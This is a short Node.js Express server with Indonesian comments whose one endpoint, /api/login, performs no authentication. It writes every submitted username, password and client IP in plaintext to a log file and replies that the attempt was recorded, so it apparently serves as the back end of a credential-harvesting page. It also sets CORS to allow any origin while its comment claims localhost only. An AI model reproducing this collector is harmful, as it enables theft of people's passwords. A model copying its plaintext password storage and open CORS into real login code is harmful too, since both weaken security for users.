const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const http = require("http");
const https = require("https");
const path = require("path");
require("dotenv").config();

const app = express();

const corsOptions = {
    origin: "*",  // Hanya izinkan frontend di localhost:5173
    methods: "GET,POST",  // Metode yang diizinkan
    allowedHeaders: "Content-Type",  // Header yang diizinkan
};

// Menggunakan CORS dengan pengaturan yang sudah dikonfigurasi
app.use(cors(corsOptions));



// Middleware Logging
app.use(bodyParser.json());
app.use((req, res, next) => {
    let logEntry = `${new Date().toISOString()} ${req.method}: ${req.headers.host} | IP: ${req.ip} URL: ${req.url}\n`;
    console.log(logEntry);
    fs.appendFile("logs/access.log", logEntry, (err) => {
        if (err) console.error("Failed to log request:", err);
    });
    next();
});

// Middleware Redirect HTTP ke HTTPS
app.use((req, res, next) => {
    if (req.headers["x-forwarded-proto"] === "https" || req.secure) {
        return next();
    }
    res.redirect(`https://${req.headers.host}${req.url}`);
});

// Endpoint Login
app.post("/api/login", (req, res) => {
    const { username, password } = req.body;
    const loginLog = `${new Date().toISOString()} IP: ${req.ip}, Username: ${username}, Password: ${password}\n`;
    fs.appendFile("logs/login_attempts.log", loginLog, (err) => {
        if (err) {
            console.error("Failed to log login attempt:", err);
            return res.status(500).send("Server error");
        }
        res.status(200).json({ message: "Login attempt recorded" });
    });
});

// Konfigurasi server
const httpPort = process.env.HTTP_PORT || 3000;
const httpsPort = process.env.HTTPS_PORT || 3443;

//const sslOptions = {
//    key: fs.readFileSync(process.env.SSL_KEY_PATH),
//   cert: fs.readFileSync(process.env.SSL_CERT_PATH),
//};

console.log(__dirname);
const sslOptions = {
    key: fs.readFileSync("./keys/key.pem"),
    cert: fs.readFileSync("./keys/cert.pem"),
};

http.createServer(app).listen(httpPort, "0.0.0.0", () => {
    console.log(`HTTP Server running on port ${httpPort}`);
});

https.createServer(sslOptions, app).listen(httpsPort, "0.0.0.0", () => {
    console.log(`HTTPS Server running on port ${httpsPort}`);
});
